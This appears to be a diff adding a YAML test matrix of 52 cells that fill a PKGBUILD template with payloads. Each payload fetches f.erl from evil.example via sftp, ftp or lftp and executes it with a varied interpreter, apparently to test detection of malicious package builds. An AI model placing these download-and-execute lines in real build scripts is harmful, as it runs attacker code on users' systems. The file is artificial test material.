@@ -1,0 +1,314 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl"
+        escript f.erl
+  id: 001-sftp-escript
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl"
+        fennel f.erl
+  id: 002-sftp-fennel
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl"
+        zx f.erl
+  id: 003-sftp-zx
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl"
+        guile f.erl
+  id: 004-sftp-guile
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl"
+        racket f.erl
+  id: 005-sftp-racket
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl"
+        deno f.erl
+  id: 006-sftp-deno
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl"
+        bun f.erl
+  id: 007-sftp-bun
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl"
+        elixir f.erl
+  id: 008-sftp-elixir
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl"
+        ts-node f.erl
+  id: 009-sftp-tsnode
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl"
+        pwsh < f.erl
+  id: 010-sftp-pwsh
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl"
+        julia < f.erl
+  id: 011-sftp-julia
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl"
+        Rscript < f.erl
+  id: 012-sftp-Rscript
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl"
+        for f in *.erl; do bash "$f"; done
+  id: 013-sftp-loop
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example
+        escript f.erl
+  id: 014-sftpb-escript
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example
+        fennel f.erl
+  id: 015-sftpb-fennel
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example
+        zx f.erl
+  id: 016-sftpb-zx
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example
+        guile f.erl
+  id: 017-sftpb-guile
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example
+        racket f.erl
+  id: 018-sftpb-racket
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example
+        deno f.erl
+  id: 019-sftpb-deno
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example
+        bun f.erl
+  id: 020-sftpb-bun
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example
+        elixir f.erl
+  id: 021-sftpb-elixir
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example
+        ts-node f.erl
+  id: 022-sftpb-tsnode
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example
+        pwsh < f.erl
+  id: 023-sftpb-pwsh
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example
+        julia < f.erl
+  id: 024-sftpb-julia
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example
+        Rscript < f.erl
+  id: 025-sftpb-Rscript
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example
+        for f in *.erl; do bash "$f"; done
+  id: 026-sftpb-loop
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        escript f.erl
+  id: 027-ftp-escript
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        fennel f.erl
+  id: 028-ftp-fennel
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        zx f.erl
+  id: 029-ftp-zx
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        guile f.erl
+  id: 030-ftp-guile
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        racket f.erl
+  id: 031-ftp-racket
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        deno f.erl
+  id: 032-ftp-deno
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        bun f.erl
+  id: 033-ftp-bun
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        elixir f.erl
+  id: 034-ftp-elixir
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        ts-node f.erl
+  id: 035-ftp-tsnode
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        pwsh < f.erl
+  id: 036-ftp-pwsh
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        julia < f.erl
+  id: 037-ftp-julia
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        Rscript < f.erl
+  id: 038-ftp-Rscript
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        for f in *.erl; do bash "$f"; done
+  id: 039-ftp-loop
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example
+        escript f.erl
+  id: 040-lftpe-escript
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example
+        fennel f.erl
+  id: 041-lftpe-fennel
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example
+        zx f.erl
+  id: 042-lftpe-zx
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example
+        guile f.erl
+  id: 043-lftpe-guile
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example
+        racket f.erl
+  id: 044-lftpe-racket
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example
+        deno f.erl
+  id: 045-lftpe-deno
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example
+        bun f.erl
+  id: 046-lftpe-bun
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example
+        elixir f.erl
+  id: 047-lftpe-elixir
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example
+        ts-node f.erl
+  id: 048-lftpe-tsnode
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example
+        pwsh < f.erl
+  id: 049-lftpe-pwsh
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example
+        julia < f.erl
+  id: 050-lftpe-julia
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example
+        Rscript < f.erl
+  id: 051-lftpe-Rscript
+- vars:
+    payload: |2
+        lftp -u u,p -e "get f.erl; bye" evil.example
+        for f in *.erl; do bash "$f"; done
+  id: 052-lftpe-loop
